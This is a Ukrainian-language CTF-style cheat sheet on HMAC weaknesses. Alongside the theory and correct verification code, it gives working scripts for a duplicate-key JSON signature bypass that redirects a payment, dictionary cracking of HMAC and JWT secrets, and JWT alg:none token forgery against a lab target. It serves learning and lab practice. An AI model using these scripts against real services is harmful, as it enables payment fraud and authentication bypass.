# Опис
#
# HMAC(K, M) = H((K⊕opad) || H((K⊕ipad) || M)). Псевдо-випадкова функція; доведено безпечна, якщо базовий хеш стійкий. Використовується в TLS, IPSec, JWT (HS256), AWS SigV4.
#
# Вразливості
#
# Сам HMAC — стійкий (length extension не працює).
# Проблеми навколо:
#
# JSON canonicalization: якщо сервер підписує json.dumps(payment) з іншими sort_keys, separators, то підпис і перевірка можуть розходитися.
# Signature stripping: сервер може приймати запити без підпису (наприклад, для public endpoints).
# Algorithm confusion (для JWT): RS256 → HS256 з публічним ключем як HMAC-ключем.
# Weak secret: короткий/передбачуваний ключ → brute force.
# Constant-time comparison обов'язкове (інакше timing attack).
# Скрипти

# (a) HMAC-SHA256 обчислення

python
import hmac, hashlib
mac = hmac.new(b"secret", b"message", hashlib.sha256).hexdigest()
print(mac)

# (b) HMAC верифікація (constant-time!)

import hmac
def verify(key, message, provided_mac):
    expected = hmac.new(key, message, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, provided_mac)

# (c) JSON canonicalization bypass (Signed, Sealed, Misinterpreted)

# Ідея: сервер підписує json.dumps(payment, sort_keys=True, separators=(",",":"), ensure_ascii=True), але парсить запит без цих параметрів.
# Якщо парсер приймає, наприклад, дубльовані ключі — можна підписати "безпечне" значення, а сервер прочитає "шкідливе".

import json, hmac, hashlib, requests

# 1) Отримуємо легітимний підписаний запит
r = requests.get("http://target:50007/challenge")
challenge = r.json()
legit_payment = challenge["payment"]         # dict
legit_sig = challenge["signature"]

# 2) Формуємо "той самий" платіж, але з дубльованим ключем
#    (деякі JSON-парсери беруть останнє входження, інші — перше)
payload = (
    '{"amount":10,"from_account":"SIM-ATTACKER",'
    '"to_account":"SIM-ATTACKER","currency":"EUR",'
    '"reference":"x","timestamp":"2024-01-01T00:00:00Z",'
    '"from_account":"SIM-BOB"}'
)

# 3) Надсилаємо той самий підпис з новим payload
headers = {"X-Signature": legit_sig, "Content-Type": "application/json"}
r = requests.post("http://target:50007/vault", data=payload, headers=headers)
print(r.text)

# Інші варіанти:
#
# Unicode escapes: "\u0061mount" vs "amount" — парсер і canonicalizer можуть обробити по-різному.
# Whitespace: підпис без пробілів, парсер із пробілами.
# Type juggling: 10 vs "10" vs 10.0.
# Array vs object для payment.

# (d) Атака на weak HMAC secret (словник)

import hmac, hashlib
target_mac = "..."
message = b'{"payment":...}'
for pw in open("rockyou.txt", errors="ignore"):
    pw = pw.strip().encode()
    if hmac.compare_digest(
        hmac.new(pw, message, hashlib.sha256).hexdigest(), target_mac
    ):
        print("FOUND:", pw); break

# (e) JWT: alg:none (Token of Trust)

import base64, json

def b64url_decode(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64url_encode(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# 1) Дивимось, що в токені
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.xxx"
h, p, s = token.split(".")
print(json.loads(b64url_decode(h)))   # {"alg":"HS256","typ":"JWT"}
print(json.loads(b64url_decode(p)))   # {"role":"guest"}

# 2) Підміна alg → none
new_header = b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
new_payload = b64url_encode(json.dumps({"role":"admin"}).encode())
forged = f"{new_header}.{new_payload}."   # порожній підпис

# (f) JWT: HS256 з weak secret

import jwt   # pip install pyjwt
for pw in open("rockyou.txt", errors="ignore"):
    pw = pw.strip()
    try:
        payload = jwt.decode(token, pw, algorithms=["HS256"])
        print("FOUND:", pw, payload); break
    except jwt.InvalidSignatureError:
        continue

# Коли що: звичайний HMAC → (a)+(b). Signed, Sealed, Misinterpreted → (c). Weak secret → (d). JWT → (e)/(f).